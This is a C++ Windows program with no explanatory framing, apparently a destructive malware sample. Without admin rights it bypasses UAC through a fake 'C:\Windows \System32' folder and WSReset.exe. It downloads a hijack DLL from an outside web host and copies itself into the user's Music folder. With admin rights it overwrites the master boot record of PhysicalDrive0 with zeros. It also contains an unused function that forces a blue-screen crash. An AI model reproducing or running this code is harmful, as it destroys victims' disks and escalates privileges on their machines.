#include <iostream>
#include <windows.h>
#include <urlmon.h>
#include <winternl.h>
#define tozero(p,s) (void)memset(p,0,s)
#define MBR 512
#pragma comment(lib , "Urlmon")
using namespace std;
typedef NTSTATUS(NTAPI* pdef_NtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask OPTIONAL, PULONG_PTR Parameters, ULONG ResponseOption, PULONG Response);
typedef NTSTATUS(NTAPI* pdef_RtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);

bool chkadmin()
{
    BOOL fRet = FALSE;
    HANDLE hToken = NULL;
    if( OpenProcessToken( GetCurrentProcess( ),TOKEN_QUERY,&hToken ) ) {
        TOKEN_ELEVATION Elevation;
        DWORD cbSize = sizeof( TOKEN_ELEVATION );
        if( GetTokenInformation( hToken, TokenElevation, &Elevation, sizeof( Elevation ), &cbSize ) ) {
            fRet = Elevation.TokenIsElevated;
        }
    }
    if( hToken ) {
        CloseHandle( hToken );
    }
    return fRet;
}

void bsod()
{
	BOOLEAN bEnabled;
	ULONG uResp;
	LPVOID lpFuncAddress = GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlAdjustPrivilege");
	LPVOID lpFuncAddress2 = GetProcAddress(GetModuleHandle("ntdll.dll"), "NtRaiseHardError");    pdef_RtlAdjustPrivilege NtCall = (pdef_RtlAdjustPrivilege)lpFuncAddress;
	pdef_NtRaiseHardError NtCall2 = (pdef_NtRaiseHardError)lpFuncAddress2;
	NTSTATUS NtRet = NtCall(19, TRUE, FALSE, &bEnabled);
	NtCall2(STATUS_FLOAT_MULTIPLE_FAULTS, 0, 0, 0, 6, &uResp);
};


void Bypass()
{
    system("mkdir \"C:\\Windows \\\"");
    system("mkdir \"C:\\Windows \\System32\"");
    system("copy C:\\Windows\\System32\\WSReset.exe \"C:\\Windows \\System32\"");
    URLDownloadToFileA(NULL, "https://centrifugal-wartime.000webhostapp.com/propsys.txt", "C:\\Windows \\System32\\propsys.dll",0,NULL);

}

string usrpath()
{
    char buffer[MAX_PATH] = {0};
    GetModuleFileNameA(NULL, buffer,MAX_PATH);
    return string(buffer);
}

int main(int agrc, char *argv[])
{
    FreeConsole();
    if(chkadmin() == false)
    {
        Bypass();
        string usr = usrpath();
        string dst = getenv("USERPROFILE");
        string dstf = dst + "\\Music\\MStore.exe";
        CopyFileA(usr.c_str(), dstf.c_str(),0);
        system("\"C:\\Windows \\System32\\WSReset.exe\"");
        return -1;
    }
    DWORD write;
    char mbr[MBR];
    tozero(&mbr, MBR);
    HANDLE Target = CreateFile("\\\\.\\PhysicalDrive0", GENERIC_ALL,FILE_SHARE_READ | FILE_SHARE_WRITE,NULL,OPEN_EXISTING,NULL,NULL);
    WriteFile(Target,mbr,MBR,&write,NULL);
    int i;
    /*
    while(i < 100)
    {
        Sleep(1000);
        
    }
    */
    BlockInput(false);
    CloseHandle(Target);
    return 0;
}